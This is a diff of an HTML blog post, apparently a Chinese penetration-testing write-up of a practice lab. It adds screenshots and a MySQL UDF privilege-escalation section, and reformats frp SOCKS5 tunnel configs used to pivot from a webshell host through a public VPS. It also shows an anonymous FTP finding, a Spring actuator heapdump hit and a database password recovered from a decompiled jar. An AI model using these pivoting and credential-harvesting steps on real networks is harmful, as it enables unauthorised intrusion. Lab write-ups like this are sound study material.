@@ -278,6 +278,7 @@
         <li><a href="#内网二层代理">内网二层代理</a></li>
         <li><a href="#172221437-k8s-api未授权">172.22.14.37-k8s API未授权</a></li>
         <li><a href="#172221446-harbor">172.22.14.46-harbor</a></li>
+        <li><a href="#172221028-mysql-udf提权">172.22.10.28-mysql-udf提权</a></li>
       </ol>
     </li>
   </ol>
@@ -423,6 +424,16 @@
 	
 	
 ></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202412/3373819-20241227140155299-964448020.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241227140144307"
+	
+	
+></p>
 <blockquote>
 <p>ifconfig</p>
 <p>公网：8.130.71.173</p>
@@ -472,19 +483,19 @@
 <blockquote>
 <p>公网vps</p>
 <p>frps</p>
-<p>[common]
-bind_port = 7000</p>
+<p>[common]</p>
+<p>bind_port = 7000</p>
 </blockquote>
 <blockquote>
 <p>webshell/8.130.71.173</p>
 <p>frpc</p>
-<p>[common]
-server_addr = 公网服务器地址
-server_port = 7000</p>
-<p>[socks5]
-type = tcp
-remote_port = 6000
-plugin = socks5</p>
+<p>[common]</p>
+<p>server_addr = 公网服务器地址</p>
+<p>server_port = 7000</p>
+<p>[socks5]</p>
+<p>type = tcp</p>
+<p>remote_port = 6000</p>
+<p>plugin = socks5</p>
 </blockquote>
 <p><strong>proxifier全局流量代理</strong></p>
 <p><img src="https://img2023.cnblogs.com/blog/3373819/202412/3373819-20241220144208492-266597381.png"
@@ -500,7 +511,17 @@ plugin = socks5</p>
 <p>具体可见文章：<a class="link" href="https://mp.weixin.qq.com/s/Cq-DdH1DseOJIcEGwb0RWg"  target="_blank" rel="noopener"
     >关于内网代理、vm、frp、proxifier全局流量转发等问题</a></p>
 <h2 id="172282326-新翔0a">172.28.23.26-新翔0A
-</h2><blockquote>
+</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202412/3373819-20241227140833292-2022108997.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241227140811168"
+	
+	
+></p>
+<blockquote>
 <p>[+] ftp 172.28.23.26:21:anonymous</p>
 <p>[-&gt;]OASystem.zip</p>
 </blockquote>
@@ -705,7 +726,17 @@ plugin = socks5</p>
 	
 ></p>
 <h2 id="172282333-erp后台">172.28.23.33-ERP后台
-</h2><blockquote>
+</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202412/3373819-20241227141339293-238308030.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241227141336756"
+	
+	
+></p>
+<blockquote>
 <p>[+] PocScan <a class="link" href="http://172.28.23.33:8080/"  target="_blank" rel="noopener"
     >http://172.28.23.33:8080</a> poc-yaml-spring-actuator-heapdump-file</p>
 </blockquote>
@@ -772,24 +803,24 @@ plugin = socks5</p>
 ></p>
 <h3 id="内网二层代理">内网二层代理
 </h3><blockquote>
-<p>8.130.71.173-公网入口</p>
+<p>8.130.71.173-公网入口&ndash;同机器172.28.23.17</p>
 <p>frps</p>
 <p>[common]
 bind_port = 7000</p>
 </blockquote>
 <blockquote>
-<p>172.28.23.26</p>
+<p>172.28.23.33</p>
 <p>frpc</p>
 <p>[common]
-server_addr =172.28.23.17
-server_port = 7000</p>
+server_addr =172.28.23.17</p>
+<p>server_port = 7000</p>
 <p>[socks5]
-type = tcp
-remote_port = 6000
-plugin = socks5</p>
+type = tcp</p>
+<p>remote_port = 6000</p>
+<p>plugin = socks5</p>
 </blockquote>
 <h3 id="172221437-k8s-api未授权">172.22.14.37-k8s API未授权
-</h3><p>靶机未拉起</p>
+</h3><p>靶机访问不到，两次都打不开，很奇怪</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -850,7 +881,8 @@ plugin = socks5</p>
 	
 	
 ></p>
-<p>分析其他镜像找线索，<code>project/projectadmin</code>镜像下找到另一份带有<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>包的文件</p>
+<h3 id="172221028-mysql-udf提权">172.22.10.28-mysql-udf提权
+</h3><p>分析其他镜像找线索，<code>project/projectadmin</code>镜像下找到另一份带有<code>ProjectAdmin-0.0.1-SNAPSHOT.jar</code>包的文件</p>
 <p>反编译，找到了数据库密码</p>
 <blockquote>
 <p>172.22.10.28</p>
@@ -868,6 +900,16 @@ spring.datasource.password=My3q1i4oZkJm3</p>
 	
 ></p>
 <p>navicate都能连接，工具梭哈连接不到，真是奇怪</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202412/3373819-20241227145611482-2099446302.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241227145610664"
+	
+	
+></p>
 <p>没时间了，等沙砾赞够了再继续打吧</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
